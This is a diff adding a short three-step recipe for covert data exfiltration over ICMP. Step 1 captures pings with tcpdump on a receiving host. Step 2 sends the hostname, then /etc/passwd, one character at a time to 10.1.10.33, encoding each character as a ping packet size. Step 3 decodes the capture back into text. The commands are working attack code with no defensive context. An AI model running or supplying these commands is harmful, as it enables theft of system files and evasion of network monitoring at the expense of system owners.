@@ -1,0 +1,16 @@
+step 1
+# run this on the receiving system
+tcpdump -nni eth0 -e icmp[icmptype] == 8 -w output.pcap
+
+step 2
+# send the hostname as output
+ip=10.1.10.33;output=`hostname`;for ((i=0;i<${#output};i++));do; ping -c 1 -s `printf '%d\n' "'${output:$i:1}'"` $ip;done
+
+# and now send the passwd file ...
+# ip is the name/ip of the receiver in step 1
+ip=10.1.10.33;output=`cat /etc/passwd`;for ((i=0;i<${#output};i++));do; ping -c 1 -s `printf '%d\n' "'${output:$i:1}'"` $ip;done
+
+step 3
+# stop tcpdump from step 1
+# read in the pcap file, spit out the data in readable format
+tcpdump -ttttnnr output.pcap | awk '{print $NF}' | while read ord; do printf "\\$(printf '%03o' "`expr $ord - 8`")"; done; echo
